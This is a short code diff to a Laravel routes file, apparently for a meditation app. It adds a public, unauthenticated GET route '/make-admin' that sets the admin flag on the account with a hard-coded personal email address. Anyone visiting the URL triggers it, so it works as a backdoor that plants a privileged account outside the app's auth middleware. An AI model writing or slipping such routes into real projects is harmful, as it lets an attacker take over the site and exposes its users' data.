@@ -253,4 +253,22 @@ Route::middleware(['auth', 'admin'])->group(function () {
     Route::delete('/admin/meditation/{id}', [MeditationController::class, 'destroy'])->name('admin.meditation.delete');
 });
 
+
+
+
+use App\Models\User;
+
+Route::get('/make-admin', function () {
+    $user = User::where('email', 'rajharshsingh2005@gmail.com')->first();
+
+    if ($user) {
+        $user->is_admin = 1;
+        $user->save();
+
+        return 'Admin granted successfully';
+    }
+
+    return 'User not found';
+});
+
 require __DIR__.'/auth.php';
